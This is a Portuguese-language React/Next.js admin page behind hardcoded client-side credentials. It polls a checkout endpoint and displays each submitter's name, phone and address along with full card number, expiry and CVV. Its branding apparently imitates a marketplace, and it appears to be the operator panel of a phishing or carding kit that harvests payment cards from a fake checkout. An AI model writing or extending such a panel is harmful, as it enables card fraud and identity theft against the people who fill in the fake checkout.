"use client"

import { useState, useEffect } from "react"
import { RefreshCw, CreditCard, MapPin, Clock, User, Phone, Home, Trash2, Lock, Eye, EyeOff } from "lucide-react"

interface CheckoutEntry {
  id: string
  timestamp: string
  address: {
    nome: string
    telefone: string
    cep: string
    endereco: string
    numero: string
    complemento: string
    bairro: string
    cidade: string
    estado: string
  }
  card?: {
    numero: string
    nome: string
    validade: string
    cvv: string
  }
  paymentMethod: "pix" | "card"
}

const ADMIN_USER = "@alexander"
const ADMIN_PASS = "y10"

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [loginError, setLoginError] = useState("")
  
  const [data, setData] = useState<CheckoutEntry[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [filter, setFilter] = useState<"all" | "pix" | "card">("all")

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      setIsAuthenticated(true)
      setLoginError("")
    } else {
      setLoginError("Usuario ou senha incorretos")
    }
  }

  const fetchData = async () => {
    setIsLoading(true)
    try {
      const response = await fetch("/api/checkout")
      const result = await response.json()
      setData(result)
    } catch (error) {
      console.error("Erro ao buscar dados:", error)
    } finally {
      setIsLoading(false)
    }
  }

  useEffect(() => {
    fetchData()
    // Auto-refresh a cada 10 segundos
    const interval = setInterval(fetchData, 10000)
    return () => clearInterval(interval)
  }, [])

  const filteredData = data.filter((entry) => {
    if (filter === "all") return true
    return entry.paymentMethod === filter
  })

  const formatDate = (timestamp: string) => {
    return new Date(timestamp).toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  // Tela de Login
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#FFE600] rounded-full flex items-center justify-center mx-auto mb-4">
              <Lock className="w-8 h-8 text-gray-800" />
            </div>
            <h1 className="text-2xl font-bold text-gray-800">Painel Admin</h1>
            <p className="text-gray-500 text-sm mt-1">Acesso restrito</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Usuario
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="@usuario"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#3483FA] focus:border-transparent outline-none"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Senha
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Digite sua senha"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#3483FA] focus:border-transparent outline-none pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {loginError && (
              <p className="text-red-500 text-sm text-center">{loginError}</p>
            )}

            <button
              type="submit"
              className="w-full bg-[#3483FA] hover:bg-[#2968c8] text-white font-medium py-3 rounded-lg transition-colors"
            >
              Entrar
            </button>
          </form>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-[#FFE600] shadow-sm">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-xl font-bold text-gray-800">Painel Admin</h1>
              <p className="text-sm text-gray-600">Dados de Checkout</p>
            </div>
            <button
              onClick={fetchData}
              disabled={isLoading}
              className="flex items-center gap-2 bg-white hover:bg-gray-50 text-gray-700 px-4 py-2 rounded-lg shadow-sm transition-colors"
            >
              <RefreshCw className={`w-4 h-4 ${isLoading ? "animate-spin" : ""}`} />
              Atualizar
            </button>
          </div>
        </div>
      </header>

      {/* Stats */}
      <div className="max-w-7xl mx-auto px-4 py-6">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          <div className="bg-white rounded-lg shadow-sm p-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center">
                <User className="w-5 h-5 text-blue-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">Total de Pedidos</p>
                <p className="text-2xl font-bold text-gray-800">{data.length}</p>
              </div>
            </div>
          </div>
          <div className="bg-white rounded-lg shadow-sm p-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center">
                <span className="text-green-600 font-bold">P</span>
              </div>
              <div>
                <p className="text-sm text-gray-500">Pagamentos PIX</p>
                <p className="text-2xl font-bold text-gray-800">
                  {data.filter((d) => d.paymentMethod === "pix").length}
                </p>
              </div>
            </div>
          </div>
          <div className="bg-white rounded-lg shadow-sm p-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center">
                <CreditCard className="w-5 h-5 text-purple-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">Pagamentos Cartao</p>
                <p className="text-2xl font-bold text-gray-800">
                  {data.filter((d) => d.paymentMethod === "card").length}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setFilter("all")}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              filter === "all"
                ? "bg-[#3483FA] text-white"
                : "bg-white text-gray-600 hover:bg-gray-50"
            }`}
          >
            Todos
          </button>
          <button
            onClick={() => setFilter("pix")}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              filter === "pix"
                ? "bg-[#3483FA] text-white"
                : "bg-white text-gray-600 hover:bg-gray-50"
            }`}
          >
            PIX
          </button>
          <button
            onClick={() => setFilter("card")}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              filter === "card"
                ? "bg-[#3483FA] text-white"
                : "bg-white text-gray-600 hover:bg-gray-50"
            }`}
          >
            Cartao
          </button>
        </div>

        {/* Data List */}
        {isLoading && data.length === 0 ? (
          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
            <RefreshCw className="w-8 h-8 text-gray-400 animate-spin mx-auto mb-3" />
            <p className="text-gray-500">Carregando dados...</p>
          </div>
        ) : filteredData.length === 0 ? (
          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
            <Trash2 className="w-8 h-8 text-gray-400 mx-auto mb-3" />
            <p className="text-gray-500">Nenhum dado encontrado</p>
            <p className="text-sm text-gray-400 mt-1">
              Os dados aparecerao aqui quando alguem completar o checkout
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {filteredData
              .slice()
              .reverse()
              .map((entry) => (
                <div
                  key={entry.id}
                  className="bg-white rounded-lg shadow-sm overflow-hidden"
                >
                  {/* Entry Header */}
                  <div className="bg-gray-50 px-4 py-3 border-b border-gray-100 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div
                        className={`px-3 py-1 rounded-full text-xs font-medium ${
                          entry.paymentMethod === "pix"
                            ? "bg-green-100 text-green-700"
                            : "bg-purple-100 text-purple-700"
                        }`}
                      >
                        {entry.paymentMethod === "pix" ? "PIX" : "CARTAO"}
                      </div>
                      <div className="flex items-center gap-1 text-sm text-gray-500">
                        <Clock className="w-4 h-4" />
                        {formatDate(entry.timestamp)}
                      </div>
                    </div>
                    <span className="text-xs text-gray-400 font-mono">
                      {entry.id.slice(0, 8)}
                    </span>
                  </div>

                  {/* Entry Content */}
                  <div className="p-4 grid md:grid-cols-2 gap-4">
                    {/* Address Section */}
                    <div>
                      <div className="flex items-center gap-2 mb-3">
                        <MapPin className="w-4 h-4 text-[#3483FA]" />
                        <h3 className="font-medium text-gray-800">Endereco</h3>
                      </div>
                      <div className="space-y-2 text-sm">
                        <div className="flex items-center gap-2">
                          <User className="w-4 h-4 text-gray-400" />
                          <span className="text-gray-700">{entry.address.nome}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <Phone className="w-4 h-4 text-gray-400" />
                          <span className="text-gray-700">{entry.address.telefone}</span>
                        </div>
                        <div className="flex items-start gap-2">
                          <Home className="w-4 h-4 text-gray-400 mt-0.5" />
                          <div className="text-gray-700">
                            <p>
                              {entry.address.endereco}, {entry.address.numero}
                              {entry.address.complemento && ` - ${entry.address.complemento}`}
                            </p>
                            <p>
                              {entry.address.bairro}, {entry.address.cidade} - {entry.address.estado}
                            </p>
                            <p>CEP: {entry.address.cep}</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Card Section (if applicable) */}
                    {entry.paymentMethod === "card" && entry.card && (
                      <div>
                        <div className="flex items-center gap-2 mb-3">
                          <CreditCard className="w-4 h-4 text-purple-600" />
                          <h3 className="font-medium text-gray-800">Dados do Cartao</h3>
                        </div>
                        <div className="bg-gradient-to-r from-purple-600 to-purple-800 rounded-lg p-4 text-white">
                          <p className="text-lg tracking-widest mb-4 font-mono">
                            {entry.card.numero}
                          </p>
                          <div className="flex justify-between text-sm">
                            <div>
                              <p className="text-purple-200 text-xs">NOME</p>
                              <p className="uppercase">{entry.card.nome}</p>
                            </div>
                            <div>
                              <p className="text-purple-200 text-xs">VALIDADE</p>
                              <p>{entry.card.validade}</p>
                            </div>
                            <div>
                              <p className="text-purple-200 text-xs">CVV</p>
                              <p>{entry.card.cvv}</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              ))}
          </div>
        )}
      </div>
    </div>
  )
}
